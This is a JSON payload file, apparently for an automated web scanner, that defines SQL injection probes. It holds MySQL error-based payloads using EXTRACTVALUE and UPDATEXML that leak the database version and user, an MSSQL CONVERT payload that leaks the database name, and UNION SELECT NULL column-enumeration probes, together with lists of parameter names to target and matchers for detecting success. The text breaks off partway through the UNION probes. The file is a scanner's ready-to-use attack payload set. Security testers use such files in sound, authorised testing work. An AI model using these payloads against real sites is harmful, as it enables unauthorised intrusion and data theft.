{
  "category": "sqli",
  "description": " (core: error/union/generic/waf-bypass)",
  "contexts": {
    "error_based": {
      "description": "Error-based SQL injection for explicit data extraction via database error messages",
      "tech_match": [
        "MySQL",
        "MSSQL",
        "Apache",
        "PHP",
        "IIS",
        "ASP.NET"
      ],
      "param_match": [
        "id",
        "uid",
        "pid",
        "num",
        "page",
        "idx",
        "index",
        "cat",
        "item_id",
        "user_id",
        "order_id"
      ],
      "probes": [
        {
          "payload": "{{baseline}} AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
          "description": "MySQL EXTRACTVALUE error-based extraction \u2014 XPATH syntax error leaks version() output",
          "matchers": [
            {
              "type": "word",
              "words": [
                "XPATH syntax",
                "xpath syntax"
              ],
              "condition": "or"
            }
          ],
          "severity": "high",
          "confidence_boost": 70,
          "variables": {}
        },
        {
          "payload": "{{baseline}} AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)-- -",
          "description": "MySQL UPDATEXML error-based extraction \u2014 XPATH syntax error leaks current DB user",
          "matchers": [
            {
              "type": "word",
              "words": [
                "XPATH syntax",
                "xpath syntax"
              ],
              "condition": "or"
            }
          ],
          "severity": "high",
          "confidence_boost": 70,
          "variables": {}
        },
        {
          "payload": "{{baseline}}' AND 1=CONVERT(int,(SELECT DB_NAME()))--",
          "description": "MSSQL CONVERT type mismatch error reveals current database name",
          "matchers": [
            {
              "type": "word",
              "words": [
                "conversion failed",
                "Conversion failed"
              ],
              "condition": "or"
            }
          ],
          "severity": "high",
          "confidence_boost": 70,
          "variables": {}
        }
      ]
    },
    "union_detect": {
      "description": "UNION-based column count enumeration \u2014 determines number of columns by incrementing NULLs until query succeeds",
      "tech_match": [],
      "param_match": [
        "id",
        "uid",
        "pid",
        "num",
        "page",
        "idx",
        "index",
        "cat",
        "item_id",
        "user_id",
        "order_id"
      ],
      "probes": [
        {
          "payload": "{{baseline}} UNION SELECT NULL-- -",
          "description": "Single-column UNION probe \u2014 status 200 or length diff indicates correct column count",
          "matchers": [
            {
              "type": "status",
              "status": [
                200
              ]
            },
            {
              "type": "length_diff",
              "min_diff": 50
            }
          ],
          "severity": "high",
          "confidence_boost": 35,
          "variables": {}
        },
        {
          "payload": "{{baseline}} UNION SELECT NULL,NULL-- -",
